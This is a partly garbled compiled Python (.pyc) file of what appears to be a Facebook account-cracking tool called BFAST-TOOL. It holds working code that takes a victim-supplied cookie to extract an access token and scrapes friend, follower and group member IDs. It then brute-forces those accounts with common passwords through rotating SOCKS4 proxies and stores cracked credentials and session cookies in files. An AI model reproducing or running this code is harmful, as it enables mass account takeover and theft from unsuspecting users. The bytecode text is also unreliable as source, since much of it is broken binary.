o
    ~9?b??  ?                   @   s?  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl
mZ d d	lmZ  d d
l!m"Z# d dl
mZ$ d dl
m%Z% d dl&m'Z( e%?)?  e? Z*g Z+g Z,g Z-e ?.? Z/g Z0ze ?1d?j2Z3e4dd??5e3? W n e6y? Z7 z
ed? W Y dZ7[7ndZ7[7ww e4dd??8? ?9? Z3e:d?D ]?Z;dZ<e?=dd?Z>e?=dd?Z?dZ@e?=dd?Z7dZAe?=dd?ZBe?=dd?ZCe?=dd?ZDe?=dd?ZEdZFe<? e>? de?? de@? e7? eA? eB? deC? deD? deE? deF? ?ZGe+?HeG? dZIe?Jg d??Z>d Z?e?Jg d!??Z@e?=dd"?Z7e?Jg d!??ZAd#ZBe?=d$d?ZCd%ZDe?=d&d'?ZEe?=d(d)?ZFd*ZKeI? de>? d+e?? e@? e7? eA? d,eB? eC? deD? deE? deF? deK? ?ZLe,?HeL? q?e:d-?D ]`ZMd.Z<e?=dd?Z>e?=dd?Z?e?Jg d!??Z@e?Jg d!??Z7e?Jg d!??ZAe?Jg d!??ZBe?=dd?ZCd/ZDe?=dd?ZEe?=dd?ZFd0ZKe<? e>? d1e?? e@? e7? eA? eB? eC? eD? eE? deF? deK? ?ZN?qxd2d3? ZGg g d d d g g g g g g g g f\ZOZPaQaRaSZTZUZVZWZXZYZZZ[g Z-g g Z\Z]d4Z^d5Z_d6Z`d7Zad8Zbd9Zcd:Zdd;Zed<Zfd=Zgd>ZMd5Zhd?ZFd6ZCd@ZidAZjdBZkd:Z>dCZle?JeheFeCeje>g?ZmdDdEdFdGdHdIdJdKdLdMdNdOdP?ZndDdEdFdGdHdIdJdKdLdMdNdQdR?Zoej?p? jqZrenesej?p? jt? Zuej?p? jvZwdSeser? dT eseu? dT esew? dU ZxdVeser? dT eseu? dT esew? dU ZydWdX? ZzdYdZ? Z{d[d\? Z|d]d^? Z}e}?  d_d`? Z~dadb? Zdcdd? Z?dedf? Z?dgdh? Z?didj? Z?dkdl? Z?dmdn? Z?e>do eC dp e> dq Z?drds? Z?dtdu? Z?dvdw? Z?dxdy? Z?dzd{? Z?d|d}? Z?d~d? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?e?d?k?rEze??d?? W n   Y ze??d?? W n   Y ze??d?? W n   Y ze??d?? W n   Y ze??d?? W n   Y e?  dS dS )??    N)?Table)?Console)?BeautifulSoup)?ThreadPoolExecutor)?Group)?Panel)?print)?Markdown)?Columns)?pretty)?Textzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt?wu2   [[[1;92mâ€¢[1;97m] [[1;96mAlvino_adijaya_xy?ri'  z!Mozilla/5.0 (Symbian/3; Series60/?   ?	   ZNokia?d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/?   zMobile Safari/535.1?.? zMozilla/5.0 (Linux; U; Android)?6?7?8?9?10?11?12z en-us; GT-)?A?B?C?D?E?F?G?H?I?J?K?L?M?N?O?P?Q?R?S?T?U?V?W?X?Y?Zi?  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/?I   ?0ih  i$  ?(   ??   zMobile Safari/537.36z; z) ?
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B?/c                  C   s?   zt dd??? ?? } | D ]}t?|? qW d S    t?d?j}t dd?} t?	dt
|??}|D ]	}| ?|d ? q/t dd??? ?? } Y d S )Nz	bbnew.txtr   z0https://github.com/EC-1709/a/blob/main/bbnew.txtz
.bbnew.txtr   zline">(.*?)<?
)?open?read?
splitlines?ugen?append?requests?get?text?re?findall?str?write)?uaZub?a?aaZun? rL   ?!/storage/emulated/0/Download/k.py?uakuL   s   ?
rN   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34m?January?FebruaryZMarchZApril?MayZJuneZJulyZAugustZ	SeptemberZOctoberZNovemberZDecember)?1?2?3?4?5r   r   r   r   r   r   r   ZDevember)?01?02?03?04?05?06?07?08?09r   r   r   zOK-?-z.txtzCP-c                 C   s2   | d D ]}t j?|? t j??  t?d? qd S )Nr<   g{?G?zt?)?sys?stdoutrH   ?flush?time?sleep)?u?erL   rL   rM   ?	alvino_xyz   s   2rh   c                   C   s   t ?d? d S )N?clear)?os?systemrL   rL   rL   rM   ri   |   s   ri   c                   C   s
   t ?  d S )N)?loginrL   rL   rL   rM   ?back~   s   
rm   c                  C   s?   t t?? ?t t?? ? } d?| ?}td| ? z,t?d?j}||v r4td? t t?? ?}t	?
d? W d S td? t	?
d? t??  W d S    t??  tdkrYtt? t?  Y d S Y d S )Nr`   z[37;1mYour ID : z/https://github.com/LDVIP1/LDWIFA/blob/main/filaz[92mYOUR ID IS ACTIVE.........r   zX[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @FFRFF3.......?main)rG   rj   ?geteuid?getlogin?joinr   rB   rC   rD   rd   re   ra   ?exit?nameZlogo?chk)?uuid?idZhttpCaht?msgrL   rL   rM   rt   ?   s&   


?rt   c                	   C   sD   t ?d? tdt ? td? tdtttttttf ? td? d S )Nri   u?  %s

  /$$$$$$   /$$$$$$   /$$$$$$ 
 /$$__  $$ /$$__  $$ /$$__  $$
| $$  \__/| $$  \__/| $$  \__/
|  $$$$$$ |  $$$$$$ | $$ /$$$$
 \____  $$ \____  $$| $$|_  $$
 /$$  \ $$ /$$  \ $$| $$  \ $$
|  $$$$$$/|  $$$$$$/|  $$$$$$/
 \______/  \______/  \______/ 
                              
                              
                              

                                              
 
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	 [➣] OWNER :        @FFRFF3
	 [➣] GITHUB:         LDVIP1
	
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	
[0;91m         USE FLIGHT MODE FOR 3 SEC
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m                                                                          ? u7                %s√%s√%s√%sBFAST-TOOL%s√%s√%s√)rj   rk   r   r(   r   r#   r)   rL   rL   rL   rM   ?banner?   s   
?ry   c                  C   s?   zgt dd??? } t dd??? }t?| ? z&tjdtd  d|id?}t?|j?d }t?|j?d	 }t	||? W W d S  t
yH   t?  Y W d S  tjjyg   d
}t|dd?}t? j|dd? t?  Y W d S w  tyt   t?  Y d S w )N?
.token.txtr   ?.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   ?cookie??cookiesrs   rv   z2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN?red??styleZcyan)r=   r>   ?tokenkurA   rB   rC   ?json?loadsrD   ?menu?KeyError?login_lagi334?
exceptions?ConnectionError?mark?solr   rr   ?IOError)?token?cok?syZsy2Zsy3?li?lorL   rL   rM   rl   ?   s(   
??rl   c                  C   s>  zst ?d? t?  ttd?? t?ttt	t
tg?} tdt	? dt? d| ? d??}tjddd	d
ddddddd?	d|id?}t?d|j?}tdd??|?d??}tdd??|?}tdt? dt	? dt? dt	? dt? d?? t?d? t?  W d S  ty? } zt ?d? t ?d? tdtttttf ? t?  W Y d }~d S d }~ww ) Nri   z.	LERA COOKIE DANE : [green]Cookie[white] CHONIz  [?   â€¢z] Cookies :r   z0https://business.facebook.com/business_locationsz?Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comrR   ?#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7?	max-age=0z?text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	?
user-agent?referer?host?origin?upgrade-insecure-requests?accept-language?cache-control?accept?content-typer|   )?headersr~   z	(EAAG\w+)rz   r   r   r{   z  ?[?]z LOGIN SECCESFULLzrm -f .token.txtzrm -f .cok.txtz  %s[%sx%s]%s LOGIN NO%s)rj   rk   ry   ?cetak?nel?random?choice?m?k?h?brf   ?input?xrB   rC   rE   ?searchrD   r=   rH   ?groupr   rd   re   rr   ?	Exception)?asur|   ?dataZ
find_tokenZkenr?   rg   rL   rL   rM   r?   ?   s&   
(2

??r?   c                 C   sh  zt dd??? }t dd??? }W n ty%   td? t?d? t?  Y nw t?d? t	?  t
?d?j}ttd|  ?? td	t|? ? td
|? ?? td? td? td? td? td? td? td?}|dv rpt?  d S |dv ryt?  d S |dv r?t?  d S |dv r?t?  d S |dv r?t?  d S |dv r?t?d? t?d? td? t?  d S td? t?  d S )Nrz   r   r{   u   [Ã—] Cookies ?   ri   zhttps://api.ipify.orgz	 welcome [green]%s[white] z>> ID TO : z>> IP TO  : rx   z>> 1. CRACK PUBLIC z>> 2. CRACK FOLLOWERS z>> 3. CRACK GRUOP   z>> 4. CRACK FILE	z>> 0. exit       z
>> CHOSE : )rR   )rS   )rT   )rU   )rV   )r7   zrm -rf .token.txtzrm -rf .cookie.txtz>> Sukses Logout+Hapus Kukis z>> Pilih Yang Bener Asu )r=   r>   r?   r   rd   re   r?   rj   rk   ry   rB   rC   rD   r?   r?   rh   rG   r?   ?dump_massalZdump_follower?error?
crack_file?resultrr   rm   )Zmy_nameZmy_idr?   r?   ?ipZ_____hama__hama_____rL   rL   rM   r?   ?   sL   

?









r?   c                   C   s&   t t? dt? ?? t?d? t?  d S )Nz$>> Maaf Fitur Ini Masih Di Perbaiki r   )r   r?   r?   rd   re   rm   rL   rL   rL   rM   r?     s   

r?   c                  C   s?  t d? t d? t d? td?} | dv ?r*zt?d?}W n ty1   t d? t?d? t?  Y nw t|?d	krFt d
? t?d? t?  d S d	}i }|D ]o}zt	d| d??
? }W n   Y qL|d7 }|dk r?dt|? }|?t|?t|?i? |?|t|?i? t d| d | d tt|?? d t ? qL|?t|?t|?i? t dt|? d | d tt|?? d t ? qLtd?}z|| }W n ty?   t d? t?  Y nw zt	d| d??? ?? }	W n   t d? t?d? t?  Y d	}
tt|	??D ]#}|	|
 ?d?}d|d	 ? d|d ? ?}t? ? t|dd?? |
d7 }
q?td? t?  d S | dv ?rYzt?d?}W n t?yL   t d? t?d? t?  Y nw t|?d	k?rbt d? t?d? t?  d S d	}i }|D ]s}zt	d| d??
? }W n   Y ?qh|d7 }|d k ?r?dt|? }|?t|?t|?i? |?|t|?i? t d| d | d tt|?? d t ? ?qh|?t|?t|?i? t dt|? d | d tt|?? d t ? ?qhtd?}z|| }W n t?y?   t d? t?  Y nw zt	d| d??? ?? }	W n   t d? t?d? t?  Y d	}
tt|	??D ]1}|	|
 ?d?}d|d	 ? d|d ? ?}t? ? t|d!d?? t t? d"t? |d ? ?? |
d7 }
?qtd? t?  d S | d#v ?rct?  d S t d? t?  d S )$Nz>> Hasil OK Anda z>> Hasil CP Anda z>> Kembali	?
>> Pilih : ?rR   rW   ?CPz>> File Tidak Di Temukan ?   r   z >> Anda Tidak Memiliki Hasil CP ?   ?CP/r   r   r:   r7   r?   ?] ? [ ?
 Account ]?>> Pilih Yang Bener Kontol ?|z# ID : z PASSWORD : Zyellowr?   z[ Klik Enter ]?rS   rX   ?OKz >> Anda Tidak Mempunyai File OK ?OK/r   ?greenz	COOKIE : )r7   Z00)r   r?   rj   ?listdir?FileNotFoundErrorrd   re   rm   ?lenr=   ?	readlinesrG   ?updater?   r?   rr   r>   r?   ?range?splitr?   r?   ?hh)Zkz?vin?cih?lol?isi?hem?nom?geeh?geh?linZnocpZcpkuZcpkuniZcpkuhrL   rL   rM   r?   
  s?   


?


.2
?





?


04
?




r?   c               
   C   s  zt dd??? } t dd??? }W n ty   t?  Y nw zttd??}W n ty5   td? t?  Y nw |dk s>|dkrEtd? t?  t?	? }d	}t
|?D ]}|d7 }td
t|? d ?}t?|? qOtD ]W}z9|jd| d td	  d|id??? }|d d D ]}	z|	d d |	d  }
|
tv r?nt?|
? W q?   Y q?W qg ttfy?   Y qg tjjy?   td? t?  Y qgw ztd? tdt? ?ttt?? ? t?  W d S  tjjy?   tt? ? td? t?  Y d S  ttf?y   tdt? dt? ?? t?d? t?  Y d S w )Nrz   r   r{   z>> how many ID ? : z'>> Masukkan Angka Anjing, Malah Huruff r   r   z>> Gagal Dump Idz r   z>> ID z : z https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=r~   r}   Zfriendsr?   rv   r?   rs   z>> Sinyal Loh Kek Kontoll rx   z>> ALL ID DUMPz>> Sinyal Lo kek Kontol ?>>z Pertemanan Tidak Public r?   )r=   r>   r?   rr   ?intr?   ?
ValueErrorr   rB   ?Sessionr?   rG   ?uidrA   rC   r?   r?   rv   r?   r?   r?   r?   r?   ?settingr?   rm   r?   rd   re   )r?   r?   Zjum?sesZyzZmet?klZuserr?col?miZisorL   rL   rM   r?   l  sf   
?
?&

?
?
?

?r?   c               	   C   s  zt dd??? } t dd??? }W n ty   t?  Y nw td? td?}zDtjd| d td  d	|id
??	? }|d d D ]}zt
?|d d |d  ? W q?   Y q?tdt? d?ttt
?? ? t?  W d S  tjjy|   td? t?  Y d S  ttfy?   td? t?  Y d S w )Nrz   r   r{   z2>> Ketik ( me ) Jika Ingin Crack Follower Sendiri z>> Masukkan Idz Target : zhttps://graph.facebook.com/z.?fields=subscribers.limit(99999)&access_token=r   r|   r}   Zsubscribersr?   rv   r?   rs   z>> Total Idz :r   z>> Koneksi Internet Bermasalah z>> Gagal Mengambil Target )r=   r>   r?   rr   r   r?   rB   rC   r?   r?   rv   rA   r?   rG   r?   r?   r?   r?   r?   )r?   r?   ZpilZkoh2?pirL   rL   rM   ?dump_pengikut?  s,   
?& 
?r?   r?   u   âœ“r?   c                   C   s@   t dt t d ttt?? d ? ttt d ? 	 t?  d S )N?z [1;95mTotal ID :[1;97m z                     zA[1;97m Klik [[1;96m Enter ][1;97m Jika Ingin Langsung Crack !!)r   ?balmondr?   rG   r?   rv   r?   r?   rL   rL   rL   rM   ?lah?  s   $
r?   c                  C   s?  t d? tdt t d ?} d}d|i}d|  }t?? }zt|j||d?jd?}W n tj	j
yD   t tt d ? t?d	? t?  Y nw |?d
?}|j?dd??dd?}|dkrjt tt d ? t?d	? t?  n|dkrttt d ? t?d	? t?  n	 t dt t d | ? |?d?}g }	|D ]}
|
j}|?dd?}zt|?}|	?|?}W q?   Y q?t|	?dkr?t tt d ? nt tt d t|	d ? ? t|? d S )Nrx   z& [1;94m>> Masukkan Idz Grup :[1;94m ??Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gbar?   z#https://mbasic.facebook.com/groups/?r?   ?html.parserz Koneksi Internet Terputus..g      ???title? | Facebook? Grup Publik?Masuk Facebookz- Limit, Silahkan Mode Pesawat Dan Coba Lagi..Z	Kesalahanz Grup Tidak Ditemukan..z [1;94m>> Nama Grup :[1;97m ?tableZAnggotar   z Anggota : -z [1;94m>> Anggota :[1;97m )r   r?   r?   r?   rB   r?   ?parserrC   rD   r?   r?   r?   rd   re   rr   ?find?replaceZ
crack_grupZjalan?p?find_allr?   rA   r?   rG   ?grup1)rv   rI   ?miskinlu?urlr?   ZgnZberrZberr2ZggsZang?ffZanggoZbroZmexZjumlahrL   rL   rM   ?grup?  sN   

?



r?   c                 C   s?  g }t ?? }tdt t d ? ttt d ? ttt d ? 	 ?zd}d|i}z|d }W n   | }Y t|j||d	?jd
?}|?d?}|D ]$}t	|??
d?}	d|	v rlt	|??dd??dd?}
|
?
d?d ?dd?}qH|?d?}|D ]?}|j}|?
d?}d|v r?t?dt	|??}|d ?dd?}|?dd?}|d | }|tv r?qtt?|? tdt t d t d t	tt?? t d dd? tj??  qtd|v ?rt?dt	|??}|d ?dd?}|?
d?d }|d | }|tv r?qtt?|? tdt t d t d t	tt?? t d dd? tj??  qtqtz|}|?dd| ? W n   |?d ?}|j?d!d??d"d?}|d#k?r;nt?  Y W n- t jj?ya   zt?d$? W n t?y^   t?  Y nw Y n t?ym   t?  Y nw q!)%Nrx   z+ [1;94mJika Berhenti, Mode Pesawat 5 Detikz [1;94mSedang Mengumpulkan IDz! [1;94mTekan CTRL + C Untuk StopTr?   r?   r   r?   r?   rJ   ?>zLihat Postingan Lainnya</spanz	<a href="zamp;r   z"><imgr?   Z
mengajukanzcontent_owner_id_new.\w+zcontent_owner_id_new.z mengajukan pertanyaan .r?   r?   z { zProses Mengambil ID z }??endz > zMengumpulkan ID ?https://mbasic.facebook.comr?   r?   r?   r?   ?   )rB   r?   r   r?   r?   r?   rC   rD   r?   rG   r?   r?   rE   rF   rv   rA   r?   r?   r?   ra   rb   rc   r*   ?insertr?   r?   r?   r?   rd   re   ?KeyboardInterrupt)ZurlsZuser?   rI   r?   r?   ?setZbf2?g?cssZbcjZbcj2ZtesZcariZliatnihZsplZidsiapaZidyouZnamayouZidkuZlink_ZgirangZgirang2rL   rL   rM   r?   ?  s?   
?


@

@

?
??
??r?   c            
      C   s   zt ?d?} W n ty   td? t?d? t?  Y nw t| ?dkr1td? t?d? t?  d S d}i }| D ]v}ztd| d??	? }W n   Y q7|d7 }|d	k rd
t
|? }|?t
|?t
|?i? |?|t
|?i? tdt? dt? d?||t|?f ? q7|?t
|?t
|?i? tdt
|? d | d t
t|?? d t ? td||t|?f ? q7td?}z|| }W n ty?   tt? dt? ?? t?d? t?  Y nw ztd| d??? ?? }W n   td? t?d? t?  Y |D ]}	t?|	? q?t?  d S )N?DUMPz>> File Tidak Ditemukan r?   r   z!>> Kamu Tidak Memiliki File Dump zDUMP/r   r   r   rx   z>> %s. %s (z %sz idz )r?   r?   r?   r?   z>> %s. %s ({h} %s {x}idz) r?   r?   r?   z)>> File Tidak Ditemukan, Coba Lagi Nanti )rj   r?   r?   r   rd   re   rm   r?   r=   r?   rG   r?   r?   r?   r?   r?   r?   r>   r?   rv   rA   r?   )
r?   r?   r?   r?   r?   r?   r?   r?   r?   ?xidrL   rL   rM   r?   !  sN   

?


&0

?

r?   c                  C   s?  t t? d?? t d? t d? t d? td?} | dv r(tt?D ]}t?|? qnL| dv rUg }tt?D ]}|?|? q2t|?}|d }t|?D ]}t?|| ? |d8 }qFn| d	v rmtD ]}t	?
d
tt??}t?||? q[nt d? t?  t d? t d? t d? td?}|dv r?t?d? n|dv r?t?d? nt?d? t d? td?}	|	dv r?t d? t?  n|	dv r?t?d? nt?d? td?}
|
dv r?t?d? ttd?? td?}|?d?}|D ]}t?|? q?nt?d? t?  d S )Nz>> 1. 5pass z>> 2.  10pass z>> 3. all pass rx   ?>> CHOSE : r?   r?   r   )rT   rY   r   z>> Pilih Yang Bener Kontooll z>> 1. MOBILE z>> 2. MBASICE ?mobile)rU   rZ   ?mbasicz>> app show ( Y/t ) )rx   r?   ??yr4   ?ya?noz>> passwords ( M/T ) )r?   r(   ul   [[cyan]â€¢[white]] ADD PASSWORD 
[[cyan]â€¢[white]] Contoh :[green] 112234455,12345,19901990[white] z>>  Password  : ?,)r   r?   r?   ?sortedrv   ?id2rA   r?   r?   r?   ?randintr?   rr   ?methodrm   ?	taplikasi?pwplussr?   r?   r?   ?pwnya?passwrd)?huZtuaZmudaZbacotZbcmZbcmiZxmud?xxZhcZ_jembot_ZpwplusZpwkuZpwkuhZxpwrL   rL   rM   r?   J  sl   ?
??



?

r?   c                  C   s?  t dt? dt? dt? dt? dt? dt? dt? dt? d?? t d? t dt? dt? dt? d	t? ?t ? t dt? d
t? dt? dt? ?t ? t dt? dt? d?? tdd???8} tD ?],}|?	d?d |?	d?d ?
? }}|?	d?d }g }t|?dk r?t|?dk r?n?|?|d ? |?d? |?d? |?d? |?d? |?d? |?d? |?d? |?d? |?d ? |?d!? |?d"? |?d#? |?d$? |?d%? |?d&? nct|?dk r?|?|? nW|?|? |?|d ? |?d? |?d? |?d? |?d? |?d? |?d? |?d? |?d? |?d ? |?d!? |?d"? |?d#? |?d$? |?d%? |?d&? d'tv ?rJtD ]}|?|? ?q@n	 d(tv ?rX| ?t||? qYd)tv ?re| ?t||? qYd*tv ?rr| ?t||? qYd+tv ?r| ?t||? qY| ?t||? qYW d   ? n	1 ?s?w   Y  t d? ttd,?? t d-t? d.t? d/t? d0t? d1?	t ? t t? d-t? d2t? d/t? d3t? d4t? d?t ? t d? t d5? td6?}|d7v ?r?t?  d S t d8t? d9t? d:t? d;?? t?d<? t?  d S )=Nz>>>>> r?   z Sedang Menggeser Matahari z <<<<< rx   z	>> Hasil r?   z Tersimpan Di : zOK/%s r?   zCP/%s z>> change ip every 500ID Z1kz Idz
?   )Zmax_workersr?   r   r   r   ?   r?   Z123Z
1234512345Z19981998Z19901990Z	123455432Z19991999Z20012001Z12345678900Z	111222333Z1122334455667788Z19971997Z20002000Z
1122334455Z19961996Z19951995Z	200220002r  r  ?free?touchr  zK	[cyan]>>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] <<[white] r?   u   GOOD¢r?   z OK : z%s u   CP¢z CP : z%sz#>> CRACK DUBARA AKAITAWA ( Y/t ) ? r  r  ?	r?   z	 Good Byez << r?   )r   r?   r?   r?   r?   ?okc?cpc?tredr  r?   ?lowerr?   rA   r  r  r  ?submit?crack?	crackfree?
cracktouch?crackmbasicr?   r?   r?   ?ok?cpr?   rm   rd   re   rr   )?poolZyuzong?idfZnmfZfrs?pwvZxpwdZwoirL   rL   rM   r  ?  s?   :$$
"






























?



??<&0



r  c                  C   s\  t ?ttttttg?}tj	?
dt? dt? t? t? dt? tt?? t? dt? dt? t? t? dt? dt? t? t? d|? d?tttt?? ?? t? d??f tj	??  t ?t?}t ?t?}t?? }|D ?]G}?z3t ?t?}dd	| i}|j?d
ddd|dddddd?
? |?d|  d ?}	t?dt|	j ???!d?t?dt|	j ???!d?| dd|d?}
d?"dd? |	j#?$? ?%? D ??}|d7 }i d d
?d!d?d"d#?d$d?d%d&?d'd?d(d)?d*d+?d,|?d-d?d.d/?d0d?d1d?d2d?d3d|  d ?d4d5?d6d?}|j&d7|
d8|i|d9|d:?}d;|j#?$? ?'? v ?r=t(d<t)? d=| ? d>|? t*? ?? t+?,d?? t-d@t. dA??
| d> | dB ? t/?0| d> | ? td7 aW  nkdC|j#?$? ?'? v ?r?td7 a|j#?$? }d?"dDd? |j#?$? ?%? D ??}t(d<t? dE| ? d>|? d>|? dB|? t*? ?? t+?,dF? t-dGt1 dA??
| d> | d> | dB ? t2t3|? W  nW q_ tj4j5?y?   t6?7dH? Y q_w td7 ad S )INu
   LDK 🔥 r?   r;   ?]SSG?]SSG[?{:.0%}?]  ?httpz	socks4://?mbasic.facebook.comr?   ??1rR   ??text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9?same-origin?cors?emptyr?   ?
?Hostr?   ?sec-ch-ua-mobiler?   r?   r?   ?sec-fetch-site?sec-fetch-mode?sec-fetch-destr?   ?=https://mbasic.facebook.com/login/device-based/password/?uid=am  &flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr?name="lsd" value="(.*?)"r   ?name="jazoest" value="(.*?)"a'  https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified?login_no_pin?Zlsd?jazoestr?   ?nextZflow?pass?;c                 S   ?   g | ]
\}}d ||f ?qS ?z%s=%srL   ??.0?key?valuerL   rL   rM   ?
<listcomp>?  ?    zcrack.<locals>.<listcomp>?  m_pixel_ratio=2.625; wd=412x756r4  r?   ?	sec-ch-ua?(" Not A;Brand";v="99", "Chromium";v="98"r5  ?sec-ch-ua-platform?	"Android"r?   r?   r?   r?   ?!application/x-www-form-urlencodedr?   r?   ?x-requested-with?XMLHttpRequestr6  r7  r8  r?   ?accept-encoding?gzip, deflate, brr?   zVhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDr|   F?r?   r~   r?   ?allow_redirects?proxies?
checkpointz  z	SSGSSG>  r?   ?play-audio .cp.mp3r?   rJ   r<   ?c_userc                 S   rB  rC  rL   rD  rL   rL   rM   rH  ?  rI  z	[LDK-OK  ?play-audio .ok.mp3r?   r?   )8r?   r?   r?   r?   r?   r?   rf   r?   ra   rb   rH   r+   ?loopr?   rv   r#   r#  r$  ?format?floatrc   r@   ?ugen2rB   r?   ?proxr?   r?   rC   rE   r?   rG   rD   r?   rq   r~   ?get_dict?items?post?keysr   r&   r)   rj   ?popenr=   r  ?akunrA   r  ?cek_apk?sessionr?   r?   rd   re   )r&  r'  ZborI   ?ua2r?   ?pw?nip?proxsr?   ?dataa?koki?heade?po?coki?kukirL   rL   rM   r  ?  sL   ~




":r
 
*
(
